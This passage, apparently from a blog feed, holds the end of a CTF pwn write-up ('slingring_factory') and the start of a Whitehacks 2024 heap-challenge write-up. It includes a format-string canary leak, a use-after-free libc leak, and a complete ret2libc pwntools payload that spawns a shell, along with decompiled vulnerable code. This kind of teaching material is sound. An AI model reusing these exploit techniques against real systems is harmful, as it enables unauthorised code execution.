</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Now, all we gotta do is a <a href="https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc">ret2libc</a> - overwrite the saved return address and point it to <code>system(/bin/sh)</code> in libc.</p>
<p>The <code>system()</code> function and the string <code>/bin/sh</code> can be found in the libc. To pass in <code>/bin/sh</code> as an argument, we will need a <code>pop rdi</code> gadget. Thus, the layout of our payload can be seen as below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">our payload in pseudocode:
</span></span><span class="line"><span class="cl">padding,            <span class="c1"># until the saved return address</span>
</span></span><span class="line"><span class="cl">pop_rdi gadget,     <span class="c1"># to pass in /bin/sh as an argument</span>
</span></span><span class="line"><span class="cl">/bin/sh,
</span></span><span class="line"><span class="cl">system<span class="o">()</span>            <span class="c1"># call system(/bin/sh)</span>
</span></span></code></pre></div><p>This is made easier by the fact that the libc is provided to us. However, we still face some barriers.</p>
<ol>
<li>
<p>we need to deal with the canary and ASLR, ie get a canary and a libc offset leak.</p>
</li>
<li>
<p>we do not have a <code>pop rdi</code> gadget in the binary. Luckily, this is easily bypassable: we can simply using the <code>pop rdi</code> gadget from the libc. However, we will first need to leak the libc offset.</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ropper -f slingring_factory --search <span class="s1">&#39;pop&#39;</span>
</span></span><span class="line"><span class="cl">0x0000000000001293: pop rbp<span class="p">;</span> ret<span class="p">;</span>           <span class="c1"># no pop rdi gadget</span>
</span></span></code></pre></div><br>
<h3 id="getting-leaks">Getting leaks</h3>
<p>To bypass our first problem of leaking the canary, we can make use of the <a href="https://ir0nstone.gitbook.io/notes/types/stack/format-string">format string bug</a> at the very beginning. By testing a few values and using gdb, we are able to find the offset to the canary, which can be leaked by inputting <code>%7$p</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./slingring_factory_patched
</span></span><span class="line"><span class="cl">What is your name?
</span></span><span class="line"><span class="cl">%7<span class="nv">$p</span>
</span></span><span class="line"><span class="cl">Hello, 0xf127ff20935bb800       <span class="c1"># canary has been leaked!</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;?&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;%7$p&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Hello, &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> 
</span></span></code></pre></div><p>Now to get the libc leak, let&rsquo;s make use of the rest of the binary where we can forge and discard rings. Particularly, when we forge and then free a ring, the chunk will go to the tcache due to the <code>malloc(0x84)</code> in <code>forge_slingring()</code>.</p>
<img src='assets/slingring (4).png'>
<p>If we forge and then discard 2 rings, using the UAF bug, we are able to leak the ASLR heap offset (this is due to the chunk being in tcache). However, knowing the heap offset is irrelevant to us.</p>
<img src='assets/slingring (5).png' width=75%> 
<p>But, we can apply the same principle and use UAF to leak the libc with a smallbin chunk. How can we get a chunk to be sorted to smallbin though?</p>
<p>You can allocate a max of 7 chunks per idx to tcache. If we allocate and free 9 rings, the 8th and 9th rings will be sorted to smallbin. Then, by viewing the rings, we will be able to get a libc leak!</p>
<img src='assets/slingring (6).png'> 
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># forge 9 slingrings</span>
</span></span><span class="line"><span class="cl"><span class="c1"># (I know the copy pasting is cursed, I just got lazy)</span>
</span></span><span class="line"><span class="cl"><span class="n">forge_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">forge_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">forge_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">forge_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">forge_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">forge_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">forge_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;6&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">forge_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;7&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">forge_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;8&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># discard 9 slingrings</span>
</span></span><span class="line"><span class="cl"><span class="n">discard_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">discard_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">discard_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">discard_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">discard_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">discard_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">discard_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">discard_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;7&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">discard_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get the libc leak by viewing the 8th chunk (ie index 7)!</span>
</span></span><span class="line"><span class="cl"><span class="n">show_slingrings</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;| [144]   | &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Ring Slot #8&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_offset</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">libc_offset</span> <span class="o">=</span> <span class="n">libc_offset</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x00007f7a9a569ce0</span> <span class="o">-</span> <span class="mh">0x00007f7a9a34f000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;libc:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_offset</span>
</span></span></code></pre></div><br>
<h3 id="ret2libc">Ret2libc</h3>
<p>Now that we have obtained the canary and libc leak, we are ready to execute ret2libc, by taking advantage of the buffer overflow in <code>use_slingring()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">poprdi</span> <span class="o">=</span> <span class="mh">0x2a3e5</span> <span class="o">+</span> <span class="n">libc_offset</span>  <span class="c1"># obtain using ropper, offset of pop rdi gadget in libc</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x2db7d</span> <span class="o">+</span> <span class="n">libc_offset</span>     <span class="c1"># obtain using ropper, offset of ret gadget in libc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">56</span>        <span class="c1"># pad to canary</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span>        <span class="c1"># overwrite rbp</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>      <span class="c1"># ret gadget is to fix stack alignment issues</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>  <span class="c1"># perform ret2libc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">use_slingrings</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><br>
<h3 id="conclusion">Conclusion</h3>
<p>Don&rsquo;t be blind and somehow miss functions when you decompile 👍</p>
<p>Flag: <code>grey{y0u_4r3_50rc3r3r_supr3m3_m45t3r_0f_th3_myst1c_4rts_mBRt!y4vz5ea@uq}</code></p>
]]></content>
        </item>
        
        <item>
            <title>Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup]</title>
            <link>https://enxgmatic.github.io/blog/whitehacks/</link>
            <pubDate>Sun, 31 Mar 2024 17:43:43 +0800</pubDate>
            
            <guid>https://enxgmatic.github.io/blog/whitehacks/</guid>
            <description>&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Solves: 2&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;To deal with the overwhelming demand for the recent Swiftie concert, a waitlist system was enacted to handle the overcapacity problem. However, it&amp;rsquo;s been made aware that the program was vulnerable, and some fanatic fans have even exploited it to skip the waitlist entirely. Just how did they do it?&lt;/p&gt;
&lt;p&gt;By GovTech&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc ctf2.whitehats.site 2005&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;initial-analysis&#34;&gt;Initial Analysis&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./checksec waitlist
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Arch:     amd64-64-little
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RELRO:    Full RELRO
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Stack:    Canary found
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;NX:       NX enabled
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PIE:      PIE enabled
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./waitlist
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Welcome to the ticket portal &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the Swiftie concert. Unfortunately, due to overwhelming demand, our tickets are all sold out. However, &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you still wish to try &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; a chance to obtain one, please join our waitlist.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Here is the &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; passcode to leave the waitlist should you change your mind: &lt;span class=&#34;m&#34;&gt;140456273802736&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Options:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1. Join the waitlist
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2. View the waitlist
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3. Leave the waitlist
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;4. Exit
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Decompiling the binary in Ghidra, the &lt;code&gt;main()&lt;/code&gt; function simply lets us choose between 3 options: joining the waitlist [&lt;code&gt;add()&lt;/code&gt;], viewing the waitlist [&lt;code&gt;delete()&lt;/code&gt;] and leaving the waitlist [&lt;code&gt;view()&lt;/code&gt;].&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p><em>Solves: 2</em></p>
<p>To deal with the overwhelming demand for the recent Swiftie concert, a waitlist system was enacted to handle the overcapacity problem. However, it&rsquo;s been made aware that the program was vulnerable, and some fanatic fans have even exploited it to skip the waitlist entirely. Just how did they do it?</p>
<p>By GovTech</p>
<p><code>nc ctf2.whitehats.site 2005</code></p>
<h2 id="initial-analysis">Initial Analysis</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./checksec waitlist
</span></span><span class="line"><span class="cl">Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">Stack:    Canary found
</span></span><span class="line"><span class="cl">NX:       NX enabled
</span></span><span class="line"><span class="cl">PIE:      PIE enabled
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------
</span></span><span class="line"><span class="cl">$ ./waitlist
</span></span><span class="line"><span class="cl">Welcome to the ticket portal <span class="k">for</span> the Swiftie concert. Unfortunately, due to overwhelming demand, our tickets are all sold out. However, <span class="k">if</span> you still wish to try <span class="k">for</span> a chance to obtain one, please join our waitlist.
</span></span><span class="line"><span class="cl">Here is the <span class="nb">exit</span> passcode to leave the waitlist should you change your mind: <span class="m">140456273802736</span>
</span></span><span class="line"><span class="cl">Options:
</span></span><span class="line"><span class="cl">1. Join the waitlist
</span></span><span class="line"><span class="cl">2. View the waitlist
</span></span><span class="line"><span class="cl">3. Leave the waitlist
</span></span><span class="line"><span class="cl">4. Exit
</span></span><span class="line"><span class="cl">&gt;
</span></span></code></pre></div><p>Decompiling the binary in Ghidra, the <code>main()</code> function simply lets us choose between 3 options: joining the waitlist [<code>add()</code>], viewing the waitlist [<code>delete()</code>] and leaving the waitlist [<code>view()</code>].</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">local_18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ignore_me_init_buffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s">&#34;Welcome to the ticket portal for the Swiftie concert. Unfortunately, due to overwhelming dema nd, our tickets are all sold out. However, if you still wish to try for a chance to obtain one , please join our waitlist.&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Here is the exit passcode to leave the waitlist should you change your mind: %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">exit</span><span class="p">);</span> <span class="c1">// leaks the address of exit()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_00100d18</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* when we pick option 4, aka exit */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* prints out the options */</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_14</span> <span class="o">=</span> <span class="nf">getOption</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* when we pick option 2, aka to view the waitlist */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Queue #: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100e9c</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nf">view</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="cm">/* when we pick option 3, aka leave the waitlist */</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="k">goto</span> <span class="n">code_r0x00100c7b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Queue #: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100e9c</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">delete</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* when we pick option 1, aka join the waitlist */</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">LAB_00100d0c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">code_r0x00100c7b</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_00100d0c</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You are not supposed to be here!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">LAB_00100d18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Already, this is pretty reminiscent of a typical Create, View, Edit and Delete heap challenge, though interestingly without an Edit option.</p>
<p>Additionally, we are given the address of <code>exit()</code>, which means we can obtain the libc base address (since ASLR is enabled).</p>
<br>
<p>Let&rsquo;s check out <code>add()</code> first, which runs when we pick option 1 to join the waitlist:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">add</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">__s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span> <span class="c1">// Allocate a chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">__s</span><span class="p">);</span> <span class="c1">// Vulnerable to buffer overflow
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">listSize</span> <span class="o">=</span> <span class="n">listSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span><span class="p">]</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You are now in queue #%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">listSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
